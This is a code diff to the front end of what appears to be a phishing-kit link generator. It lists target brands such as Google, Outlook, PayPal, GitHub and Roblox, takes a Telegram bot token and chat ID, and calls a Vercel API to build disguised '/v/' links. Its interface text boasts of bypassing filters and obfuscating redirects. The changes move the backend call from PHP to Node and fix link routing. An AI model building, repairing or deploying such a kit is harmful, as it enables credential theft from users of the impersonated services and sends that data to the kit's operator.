@@ -17,8 +17,8 @@
         }
 
         * {
-            border-radius: 0 !important; /* Forces sharp corners everywhere */
-            box-shadow: none !important; /* Removes all glow/shadows */
+            border-radius: 0 !important;
+            box-shadow: none !important;
         }
 
         body {
@@ -32,7 +32,6 @@
             overflow-x: hidden;
         }
 
-        /* Scanline effect - kept subtle without glow */
         body::before {
             content: " ";
             display: block;
@@ -79,7 +78,6 @@
             background: #110000;
             filter: grayscale(0);
             transform: translate(-2px, -2px);
-            border-width: 1px;
         }
 
         .target-card.active {
@@ -222,7 +220,7 @@
 
                 <div class="terminal-border p-12 text-center bg-red-950/5">
                     <h3 class="text-3xl font-black mb-4 text-white italic">COMPILING PAYLOAD</h3>
-                    <p class="text-red-900 text-xs mb-10 uppercase tracking-[0.3em]">Bypassing edge-layer filtering... Redirection obfuscation: 98%</p>
+                    <p class="text-red-900 text-xs mb-10 uppercase tracking-[0.3em]">Bypassing edge-layer filtering... Redirection obfuscation: 100%</p>
                     
                     <button id="gen-btn" onclick="generateLink()" class="btn-action px-16 py-6 text-lg">
                         GENERATE LINK
@@ -243,15 +241,16 @@
     </div>
 
     <script>
+        // Target IDs match folder names in /templates exactly (including case)
         const targets = [
             { id: 'google', name: 'GOOGLE', icon: 'https://www.vectorlogo.zone/logos/google/google-icon.svg' },
-            { id: 'microsoft', name: 'OUTLOOK', icon: 'https://www.vectorlogo.zone/logos/microsoft/microsoft-icon.svg' },
+            { id: 'microsoft', name: 'OUTLOOK', icon: 'https://cdn-icons-png.flaticon.com/512/732/732221.png' },
             { id: 'facebook', name: 'FACEBOOK', icon: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
             { id: 'instagram', name: 'INSTAGRAM', icon: 'https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg' },
             { id: 'tiktok', name: 'TIKTOK', icon: 'https://www.vectorlogo.zone/logos/tiktok/tiktok-icon.svg', inv: true },
             { id: 'snapchat', name: 'SNAPCHAT', icon: 'https://cdn-icons-png.flaticon.com/512/15713/15713438.png' },
-            { id: 'twitter', name: 'X CORP', icon: 'https://cdn-icons-png.flaticon.com/512/11823/11823292.png', inv: true },
-            { id: 'linkedin', name: 'LINKEDIN', icon: 'https://cdn-icons-png.flaticon.com/512/3536/3536505.png' },
+            { id: 'X', name: 'X CORP', icon: 'https://cdn-icons-png.flaticon.com/512/11823/11823292.png', inv: true },
+            { id: 'linkedIn', name: 'LINKEDIN', icon: 'https://cdn-icons-png.flaticon.com/512/3536/3536505.png' },
             { id: 'amazon', name: 'AMAZON', icon: 'https://www.vectorlogo.zone/logos/amazon/amazon-icon.svg', inv: true },
             { id: 'paypal', name: 'PAYPAL', icon: 'https://cdn-icons-png.flaticon.com/512/174/174861.png' },
             { id: 'netflix', name: 'NETFLIX', icon: 'https://www.vectorlogo.zone/logos/netflix/netflix-icon.svg' },
@@ -261,7 +260,7 @@
             { id: 'yahoo', name: 'YAHOO', icon: 'https://cdn-icons-png.flaticon.com/512/3955/3955162.png' },
             { id: 'github', name: 'GITHUB', icon: 'https://cdn-icons-png.flaticon.com/512/733/733609.png', inv: true },
             { id: 'adobe', name: 'ADOBE', icon: 'https://cdn-icons-png.flaticon.com/512/888/888835.png' },
-            { id: 'roblox', name: 'ROBLOX', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/1280px-Roblox_Corporation_2025_logo.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail&_=20250725012858' }
+            { id: 'roblox', name: 'ROBLOX', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/1280px-Roblox_Corporation_2025_logo.svg.png?_=20250725012858' }
         ];
 
         let state = { target: null, config: false };
@@ -316,28 +315,37 @@
             const chat = document.getElementById('tg-chat').value;
             const btn = document.getElementById('gen-btn');
 
+            if (!token || !chat || !state.target) {
+                return;
+            }
+
             btn.innerText = "OVERRIDING FILTERS...";
             btn.disabled = true;
 
-            const formData = new FormData();
-            formData.append('token', token);
-            formData.append('chatId', chat);
-            formData.append('template', state.target);
-
             try {
-                const response = await fetch('generate.php', {
+                // FIXED: Hits /api/generate Node.js handler on Vercel
+                const response = await fetch('/api/generate', {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        chatId: chat,
+                        template: state.target
+                    })
                 });
+
+                if (!response.ok) throw new Error("API Connection Failed");
 
                 const result = await response.json();
 
-                if (result.slug) {
+                if (result.slug && result.config) {
                     const urlBox = document.getElementById('result-box');
                     const urlText = document.getElementById('final-url');
-                    const cleanUrl = `${window.location.origin}/v/${result.slug}/`;
                     
-                    urlText.innerText = cleanUrl;
+                    // Construct final URL matched with vercel.json routing
+                    const finalUrl = `${window.location.origin}/v/${state.target}/${result.slug}#${result.config}`;
+                    
+                    urlText.innerText = finalUrl;
                     urlBox.classList.remove('hidden');
                     
                     btn.innerText = "LINK DEPLOYED";
@@ -345,6 +353,7 @@
                     btn.style.color = "#333";
                 }
             } catch (error) {
+                console.error("API Error:", error);
                 btn.innerText = "RELAY TIMEOUT";
                 btn.disabled = false;
             }
